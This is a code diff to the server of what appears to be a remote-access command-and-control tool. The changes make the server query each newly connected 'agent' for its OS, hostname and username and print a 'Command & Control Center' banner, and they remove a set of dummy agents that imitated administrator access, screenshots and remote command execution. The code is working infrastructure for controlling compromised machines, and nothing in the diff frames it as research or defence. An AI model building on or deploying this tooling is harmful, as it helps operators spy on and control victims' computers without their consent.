@@ -94,10 +94,24 @@ def accept_connections():
             target, ip = sock.accept()
             try:
                 bot = Bot(target, ip)
-                logging.info(f"New agent connected - IP: {ip[0]}:{ip[1]} | Session ID: {bot.id}")
+                # Get OS info from client
+                bot.reliable_send('sysinfo')
+                sysinfo = bot.reliable_recv()
+                if sysinfo:
+                    bot.os_type = sysinfo.get('os', 'Unknown')
+                    bot.hostname = sysinfo.get('hostname', 'Unknown')
+                    bot.username = sysinfo.get('username', 'Unknown')
+                
+                logging.info(f"New agent connected - IP: {ip[0]}:{ip[1]} | OS: {bot.os_type} | Session ID: {bot.id}")
+                print(f"\n[+] New agent connected from {ip[0]}:{ip[1]}")
+                print(f"[*] Session ID: {bot.id}")
+                print(f"[*] OS: {bot.os_type}")
+                print(f"[*] Hostname: {bot.hostname}")
+                print('[**] Command & Control Center: ', end="")
+                
             except Exception as e:
                 logging.error(f"Error creating bot instance: {e}")
-            print(f'{ip} has connected!')
+                
         except socket.timeout:
             continue
         except Exception as e:
@@ -209,81 +223,12 @@ def set_alias():
     Bot.botList[session_id].alias = new_alias
     return jsonify({'message': 'Alias updated successfully'})
 
-def create_dummy_agents():
-    """Create multiple dummy agents for UI testing"""
-    dummy_configs = [
-        {
-            'ip': ('192.168.1.100', 4444),
-            'alias': 'Windows Desktop',
-            'os': 'Windows 10'
-        },
-        {
-            'ip': ('192.168.1.101', 4445),
-            'alias': 'Linux Server',
-            'os': 'Ubuntu 20.04'
-        },
-        {
-            'ip': ('10.0.0.50', 4446),
-            'alias': 'MacBook Pro',
-            'os': 'macOS'
-        },
-        {
-            'ip': ('172.16.0.10', 4447),
-            'alias': 'Windows Server',
-            'os': 'Windows Server 2019'
-        },
-        {
-            'ip': ('192.168.2.200', 4448),
-            'alias': 'Kali Linux',
-            'os': 'Kali'
-        }
-    ]
-
-    class DummySocket:
-        def __init__(self, os_type='Windows'):
-            self.os_type = os_type
-            
-        def send(self, data):
-            return len(data)
-        
-        def recv(self, size):
-            # Simulate different responses based on commands
-            try:
-                command = json.loads(data.decode())
-                if command == 'help':
-                    return json.dumps("Available commands...").encode()
-                elif command == 'check':
-                    return json.dumps(f"Running as Administrator on {self.os_type}").encode()
-                elif command.startswith('cd '):
-                    return json.dumps(f"Changed directory to {command[3:]}").encode()
-                elif command == 'screenshot':
-                    return json.dumps("Screenshot captured").encode()
-                else:
-                    return json.dumps(f"Executed command: {command} on {self.os_type}").encode()
-            except:
-                return json.dumps("Command executed").encode()
-        
-        def close(self):
-            pass
-
-    # Create dummy agents
-    for config in dummy_configs:
-        dummy_socket = DummySocket(config['os'])
-        dummy_bot = Bot(dummy_socket, config['ip'])
-        dummy_bot.alias = config['alias']
-        dummy_bot.os_type = config['os']  # Add OS type to bot for UI
-        logging.info(f"Created dummy agent: {config['alias']} ({config['ip'][0]})")
-
 def start_server():
     global sock, t1
     sock = initialise_socket()
     t1 = threading.Thread(target=accept_connections)
     t1.start()
-    
-    # Add dummy agents for testing
-    if os.environ.get('TESTING_MODE', 'true').lower() == 'true':
-        create_dummy_agents()
-        logging.info("Created dummy agents for testing")
+    logging.info("Server started successfully")
 
 # Add these functions for graceful shutdown
 def signal_handler(sig, frame):
